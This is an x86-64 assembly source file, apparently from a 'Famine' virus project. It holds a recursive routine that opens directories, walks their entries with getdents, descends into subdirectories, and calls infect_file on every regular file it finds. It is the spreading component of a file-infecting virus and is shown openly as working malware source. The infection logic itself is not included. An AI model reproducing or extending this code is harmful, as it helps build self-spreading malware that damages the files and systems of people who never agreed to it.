
%include "ft_strcpy.s"

%include "ft_strlen.s"

; r15 = int fd
; r14 = bytes read by getend
; r13 = offset of a dir in the data returned by getend
; r12 = t_famine *famine
; r8 = long pathSize


;	void recursive(t_famine *famine)
recursive:
	enter READ_DIR_BUFF_SIZE, 0	; creer un buffer sur la stack utiliser avec getend pour lire les information de donner
	;open:
	mov r12, rdi
	cmp r12, 0					; quitte si le pointeur sur structure est null (inutile pour l'instant)
	jz recursive_exit
	lea rdi, [r12 + fileName]
	mov rsi, 0			    ; O_RDONLY
	mov rax, SYS_OPEN   	
	syscall					; open(fileName, O_RDONLY);
	cmp rax, 0				; if (fd < 0) return ;
	jl recursive_exit2
	mov r15, rax			; fd
;	lea rdi, [r12 + fileName] ; rdi is not lost
	call ft_strlen				; recupere la taille de fileName
	mov r8, rax
	
	;getents
	loop_dir:
	mov rdi, r15		; fd
	mov rsi, rsp				; le buffer est la stack
	mov rdx, READ_DIR_BUFF_SIZE
	mov rax, SYS_GETDENTS
	syscall
	mov r14, rax		; byte read
	cmp rax, 0			; if (ret < 0) return ;
	jle recursive_exit


	; loop files
	xor r13, r13
	jmp files_loop_end
	files_loop:
	

	;copy file name to path

	lea rdi, [rsp + r13 + d_name]
	call ft_strlen
	add rax, r8
	cmp rax, PATH_BUFF_SIZE - 2
	jge end_recur
	lea rdi, [r12 + fileName + r8]
	cmp byte [rdi - 1], '/'
	jz slash_ok					; add a / to the path if there is none at the end
	mov byte [rdi], '/'
	inc rdi
	slash_ok:
	lea rsi, [rsp + r13 + d_name]
	call ft_strcpy


	;check type
	xor rax, rax
	xor rdi, rdi
	mov di, [rsp + r13 + d_reclen]
	add rdi, r13
	mov al, byte [rsp + rdi - 1]	; get the byte used to know the file type
	cmp rax, DT_REG
	jz recursive_infect_file
	cmp rax, DT_DIR
	jz true_start_recur
	jmp end_recur					; loop to the next file

	recursive_infect_file:

	push r14					; saves the important register used in infectfile
	push r13
	push r12
	push r8
	mov rdi, r12
	call infect_file			; infect_file(t_famine *famine);
	pop r8
	pop r12
	pop r13
	pop r14

	jmp end_recur				; loop to the next file
	true_start_recur:			; loop to the next file if the directories are . and ..
	xor rax, rax
	mov al, [rsp + r13 + d_name]
	cmp al, '.'
	jnz start_recur
	mov al, [rsp + r13 + d_name + 1]
	cmp al, '.'
	jz end_recur
	cmp al, 0
	jz end_recur

	start_recur:
	push r15			; saves the important register used in recursive
	push r14
	push r13
	push r12
	push r8
	mov rdi, r12
	call recursive		; recursive(t_famine *famine);
	pop r8
	pop r12
	pop r13
	pop r14
	pop r15


;	xor rdi, rdi						ligne inutile mais quand meme faire attention
;	lea rdi, [r12 + fileName + r8]
	
;	mov [rdi], byte 0

	end_recur:
	xor rax, rax
	mov ax, [rsp + r13 + d_reclen]
	cmp rax, 0
	jz quit_files_loop
	add r13, rax
	
	files_loop_end:
	cmp r13, r14
	jl files_loop			; while (n < getend_byte_read) {do code on a file; n += file_struct_size};
	quit_files_loop:
	jmp loop_dir			; while (1);
	recursive_exit:
	mov rdi, r15
	mov rax, SYS_CLOSE
	syscall					; close(fd)
	recursive_exit2:
	leave
	ret
